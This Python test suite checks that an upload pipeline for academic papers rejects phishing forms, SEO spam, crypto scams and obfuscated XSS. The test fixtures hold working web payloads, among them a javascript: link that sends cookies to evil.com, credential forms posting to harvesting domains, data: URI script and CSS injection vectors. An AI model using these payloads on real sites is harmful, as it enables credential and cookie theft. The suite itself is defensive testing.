"""Adversarial HTML upload test suite.

Tests realistic attack patterns against the HTMLValidator and ContentValidator
pipeline to verify the sanitization system catches real-world abuse.
"""

from app.security.html_validator import HTMLValidator
from app.security.validation import ContentValidator

FILLER_PARAGRAPH = (
    "This research investigates the fundamental properties of distributed systems "
    "in heterogeneous computing environments. We present a novel framework for "
    "analyzing performance characteristics across multiple hardware configurations. "
    "Our methodology combines empirical measurements with theoretical modeling to "
    "provide comprehensive insights into system behavior under varying workloads. "
    "The experimental results demonstrate significant improvements over existing "
    "approaches and validate our theoretical predictions. We discuss implications "
    "for future system design and suggest directions for further investigation."
)


def make_paper(body_content: str, title: str = "Research Paper") -> str:
    """Wrap body content in a minimal valid academic HTML structure."""
    return f"""<!DOCTYPE html>
<html>
<head><title>{title}</title></head>
<body>
<h1>{title}</h1>
{body_content}
<p>{FILLER_PARAGRAPH}</p>
</body>
</html>"""


class TestPhishingPages:
    """Phishing pages disguised as academic papers."""

    def setup_method(self):
        self.html_validator = HTMLValidator()
        self.content_validator = ContentValidator()

    def test_login_form_harvesting_credentials(self):
        """A paper with an embedded login form that posts to an external server."""
        html = make_paper("""
        <section>
            <h2>Supplementary Data Access</h2>
            <p>Please log in to access the full dataset used in this study.</p>
            <form action="https://evil-harvest.com/collect" method="POST">
                <label>Institutional Email</label>
                <input type="email" name="email" placeholder="you@university.edu">
                <label>Password</label>
                <input type="password" name="password">
                <button type="submit">Access Dataset</button>
            </form>
        </section>
        """)
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "external_form_action" for e in errors)

    def test_oauth_phishing_link(self):
        """Paper with a fake OAuth link using javascript: protocol."""
        html = make_paper("""
        <p>To view interactive figures, please authenticate with your
        institutional credentials:
        <a href="javascript:document.location='https://evil.com/oauth?token='+document.cookie">
            Sign in with University SSO
        </a></p>
        """)
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "javascript_url" for e in errors)

    def test_meta_refresh_redirect(self):
        """Paper that redirects to a phishing page via meta refresh."""
        html = (
            """<!DOCTYPE html>
<html>
<head>
    <title>Loading Research Paper...</title>
    <meta http-equiv="refresh" content="0;url=https://evil-university-login.com/sso">
</head>
<body>
    <h1>Loading Research Paper</h1>
    <p>Redirecting to institutional access portal...</p>
    <p>"""
            + FILLER_PARAGRAPH
            + """</p>
</body>
</html>"""
        )
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "dangerous_meta" for e in errors)


class TestSEOSpam:
    """SEO spam with academic-looking titles and keyword stuffing."""

    def setup_method(self):
        self.content_validator = ContentValidator()

    def test_keyword_stuffed_abstract(self):
        """Paper with extreme keyword repetition in the body."""
        stuffed = " ".join(["blockchain"] * 200)
        html = make_paper(
            f"""
        <section>
            <h2>Abstract</h2>
            <p>{stuffed} technology innovation paradigm framework.</p>
        </section>
        """,
            title="A Novel Blockchain Framework for Distributed Blockchain Systems",
        )
        is_valid, errors = self.content_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "keyword_stuffing" for e in errors)

    def test_hidden_spam_links(self):
        """Paper body packed with external links beyond the limit."""
        links = "\n".join(
            f'<a href="https://spam-site-{i}.com/buy">reference {i}</a>' for i in range(30)
        )
        html = make_paper(f"""
        <section>
            <h2>References</h2>
            <p>{links}</p>
        </section>
        """)
        is_valid, errors = self.content_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "excessive_links" for e in errors)

    def test_spam_keywords_in_academic_wrapper(self):
        """Spam content dressed up as an academic paper."""
        html = make_paper(
            """
        <section>
            <h2>Abstract</h2>
            <p>Buy now our revolutionary weight loss supplement. This limited offer
            guarantees risk free results. Act now to win a prize! Click here for
            guaranteed casino lottery winnings. Congratulations, you are a winner!</p>
        </section>
        """,
            title="A Clinical Study on Nutritional Supplements",
        )
        is_valid, errors = self.content_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "spam_keywords" for e in errors)


class TestCryptoScamPages:
    """Crypto scam pages that try to sneak past validation."""

    def setup_method(self):
        self.html_validator = HTMLValidator()
        self.content_validator = ContentValidator()

    def test_crypto_scam_with_event_handlers(self):
        """Crypto scam using event handlers to redirect users."""
        html = make_paper(
            """
        <section>
            <h2>Investment Returns Analysis</h2>
            <p>Our decentralized finance protocol achieved 10000% returns.</p>
            <div onmouseover="window.location='https://scam-wallet.com/connect'">
                <p>Hover to view detailed portfolio performance data.</p>
            </div>
        </section>
        """,
            title="Decentralized Finance: A Quantitative Analysis",
        )
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "forbidden_attribute" for e in errors)

    def test_crypto_with_iframe_wallet_connect(self):
        """Scam embedding a wallet-connect iframe."""
        html = make_paper("""
        <section>
            <h2>Interactive Results Dashboard</h2>
            <iframe src="https://scam-wallet-connect.io/drain" width="100%" height="400">
            </iframe>
        </section>
        """)
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "forbidden_tag" for e in errors)

    def test_crypto_data_uri_redirect(self):
        """Scam using data:text/html URI to load malicious content."""
        html = make_paper("""
        <section>
            <h2>Supplementary Materials</h2>
            <a href="data:text/html,<script>location='https://drain-wallet.com'</script>">
                View interactive chart
            </a>
        </section>
        """)
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "dangerous_protocol" for e in errors)


class TestExcessiveExternalLinks:
    """Pages with external links exceeding the 25-link limit."""

    def setup_method(self):
        self.content_validator = ContentValidator()

    def test_exactly_at_limit(self):
        """25 external links should pass (at the limit, not over)."""
        links = "\n".join(
            f'<a href="https://journal-{i}.org/paper">Ref {i}</a>' for i in range(25)
        )
        html = make_paper(f"<section>{links}</section>")
        is_valid, errors = self.content_validator.validate(html)
        link_errors = [e for e in errors if e["type"] == "excessive_links"]
        assert len(link_errors) == 0

    def test_one_over_limit(self):
        """26 external links should fail."""
        links = "\n".join(
            f'<a href="https://journal-{i}.org/paper">Ref {i}</a>' for i in range(26)
        )
        html = make_paper(f"<section>{links}</section>")
        is_valid, errors = self.content_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "excessive_links" for e in errors)

    def test_mixed_internal_and_external_links(self):
        """Only external (http/https) links count toward the limit."""
        external = "\n".join(f'<a href="https://ext-{i}.com">Ext {i}</a>' for i in range(20))
        internal = "\n".join(f'<a href="#section-{i}">Section {i}</a>' for i in range(50))
        relative = "\n".join(f'<a href="page-{i}.html">Page {i}</a>' for i in range(50))
        html = make_paper(f"<section>{external}{internal}{relative}</section>")
        is_valid, errors = self.content_validator.validate(html)
        link_errors = [e for e in errors if e["type"] == "excessive_links"]
        assert len(link_errors) == 0


class TestSocialEngineering:
    """Pages that pass HTMLValidator but contain social engineering content."""

    def setup_method(self):
        self.html_validator = HTMLValidator()
        self.content_validator = ContentValidator()

    def test_urgency_scam_language(self):
        """Page using urgent language to trick users into action."""
        html = make_paper("""
        <section>
            <h2>Important Notice</h2>
            <p>Urgent: your account will be suspended unless you act now.
            Click here to verify. This is a limited offer, buy now before
            it expires. You are a winner, congratulations!</p>
        </section>
        """)
        _, errors = self.content_validator.validate(html)
        assert any(e["type"] == "spam_keywords" for e in errors)

    def test_impersonation_with_clean_html(self):
        """Page impersonating an institution - HTML is clean but content is spam.

        The form with an external action should be caught by HTMLValidator.
        """
        html = make_paper("""
        <section>
            <h2>University Account Verification Required</h2>
            <p>Dear researcher, your institutional access expires today.
            Please re-enter your credentials to maintain access to our
            journal database. Act now to avoid losing your publications.</p>
            <form action="https://fake-university.com/verify" method="POST">
                <input type="email" placeholder="University email">
                <input type="password" placeholder="Password">
                <button type="submit">Verify Account</button>
            </form>
        </section>
        """)
        html_valid, html_errors = self.html_validator.validate(html)
        assert not html_valid, "External form action should be caught"
        assert any(e["type"] == "external_form_action" for e in html_errors)

        _, content_errors = self.content_validator.validate(html)
        assert any(e["type"] == "spam_keywords" for e in content_errors)


class TestMinimalContent:
    """HTML that technically parses but has no real scholarly content."""

    def setup_method(self):
        self.content_validator = ContentValidator()

    def test_near_empty_paper(self):
        """Bare-bones HTML with almost no text."""
        html = """<!DOCTYPE html>
<html><head><title>Paper</title></head>
<body><h1>Title</h1><p>Hello.</p></body></html>"""
        is_valid, errors = self.content_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "insufficient_content" for e in errors)

    def test_lorem_ipsum_placeholder(self):
        """Paper filled with lorem ipsum instead of real content."""
        lorem = " ".join(["lorem ipsum dolor sit amet consectetur adipiscing elit"] * 20)
        html = make_paper(f"<p>{lorem}</p>", title="Placeholder Paper")
        _, errors = self.content_validator.validate(html)
        assert any(e["type"] == "keyword_stuffing" for e in errors)

    def test_no_structure_just_text(self):
        """Enough words but no paragraph or section tags."""
        html = f"""<!DOCTYPE html>
<html><head><title>Paper</title></head>
<body>
<h1>Title</h1>
{FILLER_PARAGRAPH}
</body></html>"""
        is_valid, errors = self.content_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "missing_content_structure" for e in errors)

    def test_no_title_at_all(self):
        """Content with paragraphs but no title or h1."""
        html = f"""<!DOCTYPE html>
<html><head></head>
<body><p>{FILLER_PARAGRAPH}</p></body></html>"""
        is_valid, errors = self.content_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "missing_title" for e in errors)


class TestObfuscatedJavaScript:
    """HTML with obfuscated JavaScript using data: URIs and event handlers."""

    def setup_method(self):
        self.html_validator = HTMLValidator()

    def test_data_text_html_uri(self):
        """data:text/html URI used to smuggle executable content."""
        html = make_paper("""
        <p>View our results:
        <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
            Interactive Figure 1
        </a></p>
        """)
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "dangerous_protocol" for e in errors)

    def test_event_handler_obfuscation_mixed_case(self):
        """Event handlers with mixed casing to bypass naive filters."""
        test_cases = [
            '<div OnClick="alert(1)">Click</div>',
            '<img src=x oNeRrOr="alert(1)">',
            '<body ONLOAD="evil()">',
        ]
        for html in test_cases:
            is_valid, errors = self.html_validator.validate(html)
            assert not is_valid, f"Should reject mixed-case handler: {html}"
            assert any(e["type"] == "forbidden_attribute" for e in errors)

    def test_javascript_url_with_whitespace(self):
        """javascript: URLs with tabs/newlines to evade simple string matching."""
        test_cases = [
            '<a href="java\tscript:alert(1)">link</a>',
            '<a href="java\nscript:alert(1)">link</a>',
        ]
        for html in test_cases:
            is_valid, errors = self.html_validator.validate(html)
            # Whether these are caught depends on parser normalization,
            # but they should not produce valid clickable javascript: links
            # after parsing. If the parser normalizes them, they'll be caught.
            # If not, the browser won't execute them either.
            # We just verify the validator processes them without crashing.
            assert isinstance(is_valid, bool)

    def test_javascript_url_with_entities(self):
        """javascript: URLs using HTML entities."""
        html = '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">link</a>'
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid, "HTML-entity-encoded javascript: URL should be caught"
        assert any(e["type"] in ("javascript_url", "dangerous_protocol") for e in errors)

    def test_vbscript_protocol(self):
        """vbscript: protocol in href."""
        html = '<a href="vbscript:MsgBox(1)">link</a>'
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid
        assert any(e["type"] == "dangerous_protocol" for e in errors)

    def test_multiple_event_handlers_on_one_element(self):
        """Element with several event handlers at once."""
        html = '<div onclick="a()" onmouseover="b()" onmouseout="c()">text</div>'
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid
        handler_errors = [e for e in errors if e["type"] == "forbidden_attribute"]
        assert len(handler_errors) >= 3

    def test_css_expression_attack(self):
        """CSS expression() used for code execution (legacy IE)."""
        html = '<div style="width: expression(alert(1))">text</div>'
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid
        assert any(e["type"] in ("dangerous_css", "css_expression") for e in errors)

    def test_css_import_from_external_source(self):
        """@import pulling CSS from an attacker-controlled domain."""
        html = '<style>@import url("https://evil.com/tracker.css");</style>'
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid
        assert any(
            e["type"] in ("css_import", "css_import_external", "dangerous_css") for e in errors
        )

    def test_css_moz_binding(self):
        """-moz-binding used for XSS in old Firefox."""
        html = '<div style="-moz-binding: url(https://evil.com/xss.xml#xss)">text</div>'
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid

    def test_srcdoc_attribute_blocked(self):
        """srcdoc attribute can embed arbitrary HTML."""
        html = '<iframe srcdoc="<script>alert(1)</script>">test</iframe>'
        is_valid, errors = self.html_validator.validate(html)
        assert not is_valid
        # Should be caught either as forbidden tag (iframe) or forbidden attribute (srcdoc)
        error_types = {e["type"] for e in errors}
        assert "forbidden_tag" in error_types or "forbidden_attribute" in error_types


class TestCombinedPipeline:
    """Tests that run content through both validators, as the real upload pipeline does."""

    def setup_method(self):
        self.html_validator = HTMLValidator()
        self.content_validator = ContentValidator()

    def _validate_both(self, html: str):
        html_valid, html_errors = self.html_validator.validate(html)
        content_valid, content_errors = self.content_validator.validate(html)
        blocking_content_errors = [e for e in content_errors if e.get("severity") == "error"]
        all_pass = html_valid and len(blocking_content_errors) == 0
        return all_pass, html_errors + content_errors

    def test_well_formed_phishing_page_rejected(self):
        """A carefully crafted phishing page should be caught by at least one validator."""
        html = (
            """<!DOCTYPE html>
<html>
<head><title>Institutional Repository Access</title></head>
<body>
    <h1>Institutional Repository Access</h1>
    <section>
        <h2>Session Expired</h2>
        <p>Your session has expired. Please re-authenticate to continue
        accessing the research repository. Enter your institutional credentials
        below to restore access to your saved papers and bookmarks.</p>
        <form action="https://credential-harvest.com/login" method="POST">
            <input type="email" name="email" placeholder="university email">
            <input type="password" name="pass" placeholder="password">
            <button type="submit">Sign In</button>
        </form>
    </section>
    <p>"""
            + FILLER_PARAGRAPH
            + """</p>
</body>
</html>"""
        )
        all_pass, errors = self._validate_both(html)
        assert not all_pass
        assert any(e["type"] == "external_form_action" for e in errors)

    def test_seo_spam_disguised_as_paper(self):
        """SEO spam with academic window dressing should be flagged."""
        links = "\n".join(
            f'<a href="https://buy-papers-{i}.com">Source {i}</a>' for i in range(30)
        )
        html = make_paper(
            f"""
        <section>
            <h2>References</h2>
            {links}
        </section>
        """,
            title="A Comprehensive Review of Academic Publishing Platforms",
        )
        all_pass, errors = self._validate_both(html)
        assert not all_pass
        assert any(e["type"] == "excessive_links" for e in errors)

    def test_legitimate_paper_passes_both(self):
        """A genuine academic paper should pass both validators without issues."""
        html = """<!DOCTYPE html>
<html>
<head>
    <title>On the Convergence of Stochastic Gradient Descent</title>
    <meta name="author" content="J. Smith, M. Johnson">
    <meta name="keywords" content="optimization, machine learning, convergence">
</head>
<body>
    <article>
        <h1>On the Convergence of Stochastic Gradient Descent</h1>
        <section>
            <h2>Abstract</h2>
            <p>We present a unified analysis of stochastic gradient descent under
            relaxed smoothness assumptions. Our framework generalizes prior convergence
            results by allowing non-uniform step sizes and non-convex objectives.
            We derive tight convergence bounds that improve upon existing results in
            both the convex and non-convex settings. Empirical evaluation on benchmark
            optimization problems validates our theoretical findings.</p>
        </section>
        <section>
            <h2>Introduction</h2>
            <p>Stochastic gradient descent remains the workhorse optimization algorithm
            for training modern machine learning models. Despite decades of study, sharp
            convergence guarantees under realistic assumptions remain elusive. In this
            work, we bridge the gap between theory and practice by analyzing convergence
            under conditions that better reflect the structure of real optimization
            landscapes. Our analysis accounts for gradient noise heterogeneity and
            objective function irregularity, yielding bounds that are both tighter and
            more broadly applicable than prior work.</p>
        </section>
        <section>
            <h2>Related Work</h2>
            <p>Classical convergence results for gradient descent assume Lipschitz
            continuous gradients and strong convexity. Recent work has relaxed these
            assumptions in various directions. We build on the generalized smoothness
            framework introduced by Zhang and colleagues, extending their results to
            the stochastic setting with mini-batch sampling.</p>
            <a href="https://arxiv.org/abs/2301.00001">Zhang et al., 2023</a>
            <a href="https://arxiv.org/abs/2302.00002">Liu and Wang, 2023</a>
        </section>
    </article>
</body>
</html>"""
        all_pass, errors = self._validate_both(html)
        blocking = [e for e in errors if e.get("severity", "error") == "error"]
        assert all_pass, f"Legitimate paper should pass. Blocking errors: {blocking}"

    def test_obfuscated_attack_plus_spam(self):
        """Page combining XSS vectors with spam content should fail on multiple fronts."""
        html = (
            """<!DOCTYPE html>
<html>
<head><title>Special Offer Research</title></head>
<body>
    <h1>Special Offer Research</h1>
    <p onclick="location='https://evil.com'">Buy now! Limited offer!
    Act now for guaranteed results. Click here to win a prize!</p>
    <p>"""
            + FILLER_PARAGRAPH
            + """</p>
</body>
</html>"""
        )
        all_pass, errors = self._validate_both(html)
        assert not all_pass
        error_types = {e["type"] for e in errors}
        assert "forbidden_attribute" in error_types
        assert "spam_keywords" in error_types
